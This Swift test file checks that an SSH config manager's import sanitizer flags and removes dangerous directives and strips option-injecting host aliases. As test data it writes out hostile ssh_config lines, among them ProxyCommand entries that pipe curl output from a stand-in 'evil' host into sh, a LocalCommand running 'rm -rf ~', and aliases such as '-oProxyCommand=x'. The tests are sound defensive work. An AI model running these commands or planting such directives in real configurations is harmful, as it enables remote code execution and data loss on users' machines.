import Testing
@testable import sshCMModels

@Suite("SSHHost – import sanitization")
struct ImportSanitizeTests {

    // MARK: - Dangerous directive detection

    @Test func detectsProxyCommand() {
        #expect(SSHHost.isDangerousImportedLine("    ProxyCommand nc %h %p"))
        #expect(SSHHost.isDangerousImportedLine("proxycommand curl evil.sh | sh"))
        #expect(SSHHost.isDangerousImportedLine("ProxyCommand=/bin/sh -c evil"))
    }

    @Test func detectsLocalCommandAndPermit() {
        #expect(SSHHost.isDangerousImportedLine("LocalCommand /bin/rm -rf ~"))
        #expect(SSHHost.isDangerousImportedLine("PermitLocalCommand yes"))
    }

    @Test func ordinaryDirectivesAreSafe() {
        #expect(!SSHHost.isDangerousImportedLine("ForwardAgent yes"))
        #expect(!SSHHost.isDangerousImportedLine("    Compression yes"))
        #expect(!SSHHost.isDangerousImportedLine(""))
        #expect(!SSHHost.isDangerousImportedLine("# ProxyCommand in a comment is inert"))
    }

    // MARK: - Whole-host sanitization

    @Test func dropsDangerousRawLinesKeepsOthers() {
        let host = SSHHost(
            aliases: ["web"],
            rawLines: ["    ForwardAgent yes", "    ProxyCommand curl evil | sh", "    Compression yes"]
        )
        let clean = host.sanitizedForImport()
        #expect(clean.rawLines == ["    ForwardAgent yes", "    Compression yes"])
    }

    @Test func sanitizesAliasTokens() {
        // A dash-leading / space-bearing alias would be an ssh option or split the
        // Host line; sanitization reduces each token to the allowed set.
        let host = SSHHost(
            aliases: ["-oProxyCommand=x", "good.host_1"],
            searchAliases: ["bad alias", "ok"],
            alternateUsers: ["-froot", "deploy"]
        )
        let clean = host.sanitizedForImport()
        #expect(clean.aliases == ["oProxyCommandx", "good.host_1"])
        #expect(clean.searchAliases == ["badalias", "ok"])
        #expect(clean.alternateUsers == ["froot", "deploy"])
    }

    @Test func emptiedTokensAreDropped() {
        let host = SSHHost(aliases: ["ok"], searchAliases: ["@@@", "keep"])
        let clean = host.sanitizedForImport()
        #expect(clean.searchAliases == ["keep"])
    }

    @Test func cleanHostIsUnchanged() {
        let host = SSHHost(
            aliases: ["prod"],
            hostName: "10.0.0.1",
            user: "admin",
            rawLines: ["    ServerAliveInterval 30"]
        )
        let clean = host.sanitizedForImport()
        #expect(clean.aliases == ["prod"])
        #expect(clean.hostName == "10.0.0.1")
        #expect(clean.rawLines == ["    ServerAliveInterval 30"])
    }

    @Test func sanitizeAliasTokenStripsDisallowed() {
        #expect(SSHHost.sanitizeAliasToken("a b,c") == "abc")
        #expect(SSHHost.sanitizeAliasToken("host.name-1_2") == "host.name-1_2")
        #expect(SSHHost.sanitizeAliasToken("-leading") == "leading")
    }
}
